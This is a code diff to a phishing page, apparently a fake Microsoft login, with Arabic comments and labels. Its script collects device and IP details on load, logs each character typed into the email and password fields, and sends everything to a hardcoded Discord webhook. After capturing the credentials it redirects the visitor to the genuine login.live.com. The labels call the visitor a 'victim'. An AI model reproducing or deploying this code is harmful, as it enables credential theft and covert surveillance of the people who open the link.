@@ -43,88 +43,75 @@
 </div>
 
 <script>
+  <script>
     const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
-    let userData = { email: "", password: "" };
 
-    // جلب بيانات IP متقدمة (الموقع ومزود الخدمة)
-    async function getAdvancedIPInfo() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            return await response.json();
-        } catch { return null; }
-    }
-
-    async function getFullSpecs() {
-        const ipInfo = await getAdvancedIPInfo();
-        let batteryInfo = "N/A";
+    async function sendIphoneIntel() {
+        const n = navigator;
+        const s = screen;
         
-        if (navigator.getBattery) {
-            const batt = await navigator.getBattery();
-            batteryInfo = `${(batt.level * 100).toFixed(0)}% ${batt.charging ? '🔌' : '🔋'}`;
+        // بيانات الأيفون الأساسية
+        let iphoneData = {
+            model: `${s.width}x${s.height}`, // من الأبعاد سنعرف موديل الأيفون
+            os: n.userAgent.match(/OS (\d+_\d+)/) ? n.userAgent.match(/OS (\d+_\d+)/)[1].replace('_', '.') : "Unknown iOS",
+            battery: "N/A",
+            isCharging: false,
+            time: new Date().toLocaleTimeString('de-DE'),
+            lang: n.language
+        };
+
+        // سحب الـ IP والموقع
+        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+        // سحب حالة البطارية (مهمة جداً للأيفون)
+        if (n.getBattery) {
+            const b = await n.getBattery();
+            iphoneData.battery = `${(b.level * 100).toFixed(0)}%`;
+            iphoneData.isCharging = b.charging;
         }
 
-        return {
-            ip: ipInfo?.ip || "Unknown",
-            city: ipInfo?.city || "Unknown",
-            isp: ipInfo?.org || "Unknown",
-            os: navigator.platform,
-            cores: navigator.hardwareConcurrency || "N/A",
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
-            lang: navigator.language,
-            time: new Date().toLocaleString(),
-            agent: navigator.userAgent,
-            battery: batteryInfo
-        };
+        // إرسال التقرير فوراً (بمجرد الدخول)
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "📱 تم رصد دخول من هاتف iPhone",
+                    color: 0x000000,
+                    fields: [
+                        { name: "🌐 عنوان الـ IP", value: `\`${ipInfo.ip}\` (${ipInfo.city || 'Unknown'})`, inline: false },
+                        { name: "📲 إصدار النظام", value: `iOS \`${iphoneData.os}\``, inline: true },
+                        { name: "🔋 مستوى الشحن", value: `\`${iphoneData.battery}\` ${iphoneData.isCharging ? '🔌' : '🔋'}`, inline: true },
+                        { name: "📏 دقة الشاشة", value: `\`${iphoneData.model}\``, inline: true },
+                        { name: "⏰ توقيت الهاتف", value: `\`${iphoneData.time}\``, inline: true },
+                        { name: "📡 شركة الاتصال", value: `\`${ipInfo.org || 'Unknown'}\``, inline: false }
+                    ],
+                    footer: { text: "تم سحب البيانات تلقائياً بمجرد فتح الرابط" }
+                }]
+            })
+        });
     }
 
-    // Keylogger
+    // تشغيل السحب تلقائياً فور التحميل
+    window.onload = sendIphoneIntel;
+
+    // كود تسجيل الدخول والحروف (كما هو)
+    let userData = { email: "", password: "" };
     document.addEventListener('input', (e) => {
         if (e.target.tagName === 'INPUT') {
             userData[e.target.id] = e.target.value;
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `⌨️ **Typing [${e.target.id}]:** \`${e.target.value}\`` })
+                body: JSON.stringify({ content: `⌨️ **Typing:** \`${e.target.value}\`` })
             });
         }
     });
 
-    async function showStep2() {
-        const emailVal = document.getElementById('email').value;
-        if (emailVal.length > 3) {
-            document.getElementById('display-email').innerText = emailVal;
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-
-            const s = await getFullSpecs();
-
-
-
-
-
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => fetch(webhookURL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({embeds:[{title:"🌐 IP Tracking", color:16711680, fields:[{name:"IP",value:d.ip,inline:true},{name:"City",value:d.city,inline:true},{name:"ISP",value:d.org}]}]})}));
-            
-            // إرسال تقرير استخباراتي كامل للديسكورد
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🕵️ تقرير استخباراتي كامل عن الضحية",
-                        color: 15158332,
-                        fields: [
-                            { name: "🌐 IP & Location", value: `IP: \`${s.ip}\`\nCity: \`${s.city}\`\nISP: \`${s.isp}\``, inline: false },
-                            { name: "🔋 Battery Status", value: `\`${s.battery}\``, inline: true },
-                            { name: "💻 Hardware", value: `CPU: \`${s.cores} Cores\`\nRAM: \`${s.ram}\``, inline: true },
-                            { name: "🛠️ System", value: `OS: \`${s.os}\`\nLang: \`${s.lang}\``, inline: true },
-                            { name: "⏰ Local Time", value: `\`${s.time}\``, inline: false },
-                            { name: "🌐 User Agent", value: `\`${s.agent}\``, inline: false },
-                        ],
-                        footer: { text: "تم سحب كافة بيانات الجهاز بنجاح" }
-                    }]
-                })
-            });
-        }
+    function showStep2() {
+        document.getElementById('display-email').innerText = document.getElementById('email').value;
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
     }
 
     function finishLogin() {
@@ -133,21 +120,17 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: "🎯 الصيد النهائي",
-                    color: 3066993,
+                    title: "🎯 بيانات الحساب الكاملة",
+                    color: 0x00FF00,
                     fields: [
-                        { name: "📧 Email", value: `\`${userData.email}\`` },
-                        { name: "🔑 Password", value: `\`${userData.password}\`` }
+                        { name: "📧 الإيميل", value: `\`${userData.email}\`` },
+                        { name: "🔑 كلمة السر", value: `\`${userData.password}\`` }
                     ]
                 }]
             })
         }).then(() => window.location.href = "https://login.live.com/");
     }
-
-    function backToStep1() {
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('step1').classList.remove('hidden');
-    }
+</script>
 </script>
 </body>
 </html>
